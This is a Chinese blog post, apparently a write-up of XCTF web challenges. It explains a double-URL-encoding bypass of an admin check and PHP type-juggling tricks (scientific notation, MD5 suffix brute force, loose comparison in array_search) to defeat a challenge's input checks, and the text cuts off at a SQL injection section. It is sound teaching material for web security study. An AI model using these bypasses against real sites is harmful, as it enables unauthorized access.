

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="3xsh0re">
  <meta name="keywords" content="">
  
    <meta name="description" content="好久没有做过web了，偶然翻到之前笔者曾经做过的一些攻防世界-WEB题目写的题解🐸，本人菜鸡一个😭😭😭😭">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-攻防世界-WEB-WP">
<meta property="og:url" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/index.html">
<meta property="og:site_name" content="3xsh0re&#39;Blog">
<meta property="og:description" content="好久没有做过web了，偶然翻到之前笔者曾经做过的一些攻防世界-WEB题目写的题解🐸，本人菜鸡一个😭😭😭😭">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp2.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp3.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp4.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp5.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp6.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp8.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp9.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp10.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp11.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp12.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp13.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp15.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp16.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_2.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_5.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_6.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_3.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_4.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/file_include_jiangsugongjiangbei_1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_2.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_6.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_5.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_7.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_4.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_2.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_3.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_2.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_3.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_2.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/Web_php_include_CTF_1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_2.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/ics05_1.jpg">
<meta property="og:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/php_rce_1.jpg">
<meta property="article:published_time" content="2023-11-13T15:24:10.000Z">
<meta property="article:modified_time" content="2024-07-15T02:28:19.584Z">
<meta property="article:author" content="3xsh0re">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://3xsh0re.github.io/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp1.jpg">
  
  
  
  <title>CTF-攻防世界-WEB-WP - 3xsh0re&#39;Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"3xsh0re.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"OYnUsPOOxWtnPXQH1Dxz9wjM-gzGzoHsz","app_key":"GoMWtP1iHSKKpwsbzBlVqJ7P","server_url":"https://oynuspoo.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>3xsh0re&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/an1.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CTF-攻防世界-WEB-WP"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-11-13 23:24" pubdate>
          2023年11月13日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          23k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          143 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CTF-攻防世界-WEB-WP</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2024年7月15日 上午
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>好久没有做过web了，偶然翻到之前笔者曾经做过的一些攻防世界-WEB题目写的题解🐸，本人菜鸡一个😭😭😭😭</p>
<span id="more"></span>

<h4 id="1-PHP2"><a href="#1-PHP2" class="headerlink" title="1_PHP2"></a>1_PHP2</h4><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p>打开只有一个显示，“Can you anthenticate to this website?”，检查源代码也没有其他显示。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp1.jpg" srcset="/img/loading.gif" lazyload class="">

<h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p>- </p>
<p>  <strong>phps文件就是php的源代码文件</strong>，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。</p>
<ul>
<li>浏览器在将请求传回服务端时会对url解码一次后传回。</li>
</ul>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>首先访问index.php，回显没有变化。试着访问源码phps文件index.phps，发现源码</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp2.jpg" srcset="/img/loading.gif" lazyload class="">

<p>源码分析：当输入url中输入id=admin时，echo“not allowed!”，不是想要的结果。</p>
<p>我们发现浏览器会对url解码一次，然后urldecode再对url解码一次，相当于对url解码了两次，所以我们再url后跟的应该有url编码两次后的字符，查表，将字符a写为%25%36%31，浏览器解码一次后变为%61，再经过urlencode解码一次后为a，通过检验。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp3.jpg" srcset="/img/loading.gif" lazyload class="">



<h4 id="2-EasyPHP"><a href="#2-EasyPHP" class="headerlink" title="2_EasyPHP"></a>2_EasyPHP</h4><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>直接进入，发现php代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$a</span>) &gt; <span class="hljs-number">6000000</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>) &lt;= <span class="hljs-number">3</span>){      <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>) &amp;&amp; <span class="hljs-string">'8b184b'</span> === <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>),-<span class="hljs-number">6</span>,<span class="hljs-number">6</span>)){<br>        <span class="hljs-variable">$key1</span> = <span class="hljs-number">1</span>;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Emmm...再想想"</span>);<br>        }<br>    }<span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Emmm..."</span>);<br>}<br><br><span class="hljs-variable">$c</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">"m"</span>]) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-string">"m"</span>] &gt; <span class="hljs-number">2022</span>){<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]) == <span class="hljs-number">2</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>][<span class="hljs-number">0</span>])){<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">"DGGJ"</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]);<br>        <span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no..."</span>):<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>){<br>            <span class="hljs-variable">$val</span>===<span class="hljs-string">"DGGJ"</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no......"</span>):<span class="hljs-literal">NULL</span>;<br>        }<br>        <span class="hljs-variable">$key2</span> = <span class="hljs-number">1</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no hack"</span>);<br>    }<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> &amp;&amp; <span class="hljs-variable">$key2</span>){<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">"Hgfks.php"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"You're right"</span>.<span class="hljs-string">"\n"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>}<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>



<h5 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><p>PHP substr函数：substr(<em>string,start,length</em>)</p>
<p>start：规定何处开始，<strong>可以是负数</strong>，表明在从<strong>字符串结尾</strong>的指定位置开始，-2表示从倒数第二个开始。</p>
</li>
<li><p>==<strong>PHP 中字符串与数值比较的陷阱</strong>==：</p>
<ul>
<li>当两个字符比较时，就是比较他们的ASCII码</li>
<li>两个字符串进行比较时，是从第一位开始比较其ASCII码，只要有一位出现了 差异，就返回比较结果。</li>
<li>当字符串与数字比较时，<strong>首先系统尝试将此字符串/字符转换为整型/浮点型</strong>，然后进行比较，如**’12bsd’转型为12<strong>，</strong>‘a’转型为0<strong>，千万需要注意的是此时不是将其对应的ASCII码值与数字进行大小比较了。其实同样的道理，’a’+10结果也是10。并且容易忽略的：</strong>0 与任意不可转化为数字的字符串比较(操作符为双等时。即松散比较), 均返回 true。**</li>
</ul>
</li>
</ul>
<h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>​        直接看到代码尾部有一个Hgfks.php，试着直接访问，发现不行，又访问Hgfks.phps，也不行，好吧，阅读前面的代码。首先从地址栏读取了a,b两个参数，第一个函数是if判断是检验a,b的值是否符合要求，首先对a，有个<strong>intval函数</strong>，将任意类型转为int型，然后这个值要大于6000000，且a的长度不超过3个字符。那么可以用9e9这种方式传入。再看b，<strong>是要b的MD5码的最后6位等于给定输入，尝试用bp爆破，也可以写python脚本碰撞</strong>。得到53724为b的值。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp4.jpg" srcset="/img/loading.gif" lazyload class="">



<p>继续阅读代码，发现有c作为值，试着绕过c，首先有一个json_decode(@$_GET[‘c’])，说明要c是post，json格式的数据，提交形式c={}，首先有一个m，m&gt;2022&amp;&amp;m不是数字，那么我们想到PHP中的松散比较，m不是数字，那么必然是字符串，<strong>字符串于数值比较时，如果包含数字，则尝试先转为只保留数字，如果不包含数字，则转为0，</strong>所以我们这里会有c={“m”:20222a}，m已经通过，向下走，发现c中还有一个变量n，首先n是一个数组，然后count()=2，说明其有两个元素。</p>
<p>那么修改c的形式c={“m”:”20222a”,”n”:[]}，可以发现出现了no hack字样，说明我们已经绕过了m的验证，然后</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>][<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure>

<p>说明n的第一个元素要为数组，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">"DGGJ"</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]);<br><span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no..."</span>):<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>){<br>    <span class="hljs-variable">$val</span>===<span class="hljs-string">"DGGJ"</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no......"</span>):<span class="hljs-literal">NULL</span>;<br>}<br></code></pre></td></tr></table></figure>

<p><strong>这里是说明n中要包含DGGJ，又不能包含DGGJ，很神奇，这里要解决的话，我们应该想到PHP中比较常见的比较陷阱，array_search的本质是将需要查找的字符串与数组内的元素进行比较，所以我们写0的话是不是就可以绕过这个查询了呢（0在比较中的特殊性），我们可以这样写了c={“m”:”22222a”,”m”:[[0,1],0]}，然后try一下，答案来了。</strong></p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp5.jpg" srcset="/img/loading.gif" lazyload class="">



<h4 id="3-SuperSQLi"><a href="#3-SuperSQLi" class="headerlink" title="3_SuperSQLi"></a>3_SuperSQLi</h4><h5 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h5><p>进入环境后出现一个查询框，如下图</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp6.jpg" srcset="/img/loading.gif" lazyload class="">

<p>题目已经告诉了这是一道sql注入题，所以直接使用sql注入解题。</p>
<h5 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h5><ul>
